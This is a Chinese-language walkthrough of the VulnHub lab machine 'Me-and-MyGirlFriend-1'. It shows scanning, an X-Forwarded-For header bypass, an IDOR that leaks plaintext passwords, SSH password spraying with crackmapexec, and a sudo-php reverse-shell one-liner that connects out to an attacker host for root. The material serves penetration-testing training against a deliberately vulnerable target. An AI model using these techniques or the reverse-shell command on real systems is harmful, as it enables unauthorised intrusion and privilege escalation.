
## 靶机描述

_这是一台标榜难度为简单的开源靶机。有一对恋人，Alice 和 Bob。这对恋人无论走到哪里都很恩爱。但是自从 Alice 在 Ceban 这家私人公司工作后。Alice 对 Bob 的态度就改变了，她似乎对 Bob 隐瞒了一些事情。我们的任务是找到 Alice 隐藏的东西，并且获得公司的访问权限。_

![p1](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018174740738.png)


## 信息收集

1. 端口扫描

```text
# Nmap 7.99 scan initiated Sat Oct 17 18:12:47 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -p- -oA nmapscan/TCPS 192.168.1.8
Nmap scan report for 192.168.1.8
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:EC:84:6C (VMware)

# Nmap done at Sat Oct 17 18:12:52 2026 -- 1 IP address (1 host up) scanned in 4.49 seconds

```

目标站点开启了 22 和 80 端口。一般来说，80 端口暴露的攻击面更多。我们尝试先渗透 80 端口。

2. 详细信息扫描

```text
# Nmap 7.99 scan initiated Sat Oct 17 18:14:13 2026 as: /usr/lib/nmap/nmap -sT -sC -sV -O -p22,80 -oA nmapscan/details 192.168.1.8
Nmap scan report for 192.168.1.8
Host is up (0.00095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:EC:84:6C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 17 18:14:22 2026 -- 1 IP address (1 host up) scanned in 8.88 seconds
```

我们看到 nmap 报告中，目标 WEB 服务运行带 Apache 2.4.7 中间件上面，可能存在不少漏洞。
目标的服务器内核版本是 3.2-4.14 之间，说明可能存在内核提权的攻击面。

3. 漏洞脚本扫描

```text
# Nmap 7.99 scan initiated Sat Oct 17 18:14:55 2026 as: /usr/lib/nmap/nmap --script=vuln -p22,80 -oA nmapscan/vulns 192.168.1.8
Nmap scan report for 192.168.1.8
Host is up (0.00088s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|   /config/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /misc/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
MAC Address: 00:0C:29:EC:84:6C (VMware)

# Nmap done at Sat Oct 17 18:20:16 2026 -- 1 IP address (1 host up) scanned in 321.57 seconds
```


漏洞脚本扫描没有暴露出太多有用的信息。信息侦察就到这里，我们开始进行 WEB 渗透。


## WEB 渗透

### 未授权访问漏洞

我们进入 WEB 界面，页面显示 _Who are you? Hacker? Sorry This Site Can Only Be Accessed local!_ 这说明 WEB 站点采取了一些鉴权功能。我们进一步查看网页注释发现

![p2](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018185327803.png)

服务器注释提示我们可以采用 http 请求头参数 X-Forwarded-For 来访问。由于我们要访问 local 站点，我们要在 http 请求包添加一个请求头。

```http
X-Forwarded-For:localhost
```

这个过程可以使用 burpsuite 完成，也可以使用 curl 工具。但是更加推荐 burpsuite，它界面比较美观而且结果很直观。

![p3](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018190309615.png)


![p4](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018190341556.png)


### 任意用户注册漏洞

我们通过添加请求头，访问到了服务器本地的网站页面。我们发现网站 register 功能允许我们注册一个新用户。我们注册用户 retro，密码为000000 成功登录后台。

![p5](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018194638601.png)

![p6](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018194702661.png)


### 水平鉴权和用户密码泄露

在获得进入后台的权限后，我们发现网址处暴露了一个参数名 user_id = 13。这个可能是我们的编号。我们是当前系统的第 13 个用户。如果我们把用户改成 2 呢？会显示其他用户的内容吗？

![p7](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018195054752.png)

结果返回了 aingmaung 用户的密码在前端界面中。通过枚举 user_id ,我们得到以下账户的凭据信息。

```text
eweuhtandingan:skuyatuh
aingmaung:qwerty!!!
sundatea:indONEsia
sedihaingmah:cedihhihihi
alice:4lic3
```


## 密码喷洒获得 ssh 立足点

我们将刚才整理好的凭据文件保存为 creds.txt。通过使用 awk 工具将账号和密码分别保存为 users.txt,pass.txt。

```shell
awk -F ':' '{print $1}' creds.txt > users.txt
awk -F ':' '{print $2}' creds.txt > pass.txt
crackmapexec ssh 192.168.1.8 -u users.txt -p pass.txt --continue-on-success
```

![p8](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018200034035.png)

我们使用 alice:4lic3 凭据通过 ssh 登录服务器。

![p9](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018200231617.png)

我们获得了第一个用户 flag，并且找到了 Alice 不想 Bob 知道的事情。原来 Alice 想找个更棒的男朋友哈。难崩，总不能阻止她奔向更好的人吧！哈哈，这疑似是靶机作者的亲身经历。我们将 my_notes.txt 文件交给 Bob 后，开始尝试获得 root 权限。

![note](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018200814006.png)

## 权限提升

通过权限枚举，我们在网站的 config 文件夹下，发现了 mysql 的链接密码。

![p10](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018200359646.png)

经过尝试这不是 root 的密码。我们注意到 Alice 这个用户能够使用 sudo 命令以 root 的身份执行 php 工具。这对于我们来说，是个非常棒的切入点。我们可以构造 php 反弹 SHELL 语句，获得一个 root 身份执行的 shell 回合。

我们构造命令如下:
```shell
sudo /usr/bin/php -r '$sock=fsockopen("192.168.1.4",5566);exec("/bin/bash <&3 >&3 2>&3");'
```

我们成功拿到了 root 的 flag。

![p11](../vulnhubScreenShot/(纯)Vulnhub%20Me-and-MyGirlFriend-1%20靶机渗透总结/IMG-20261018201159377.png)


## 总结

通过信息收集，我们发现目标靶机开放了 22，80 端口。根据渗透的优先级，我尝试渗透 80 端口，发现网站给我们的提示。通过请求头绕过的方式，我们访问到了后台的核心站点。我们随便注册了一个用户，通过网站水平鉴权漏洞和用户信息泄露。我们拿到了登录凭据。通过 crackmapexec 工具我们确认 Alice 凭据是可用的。我们获得了立足点，最终通过 Alice 的 sudo 功能成功提权，获得 root flag。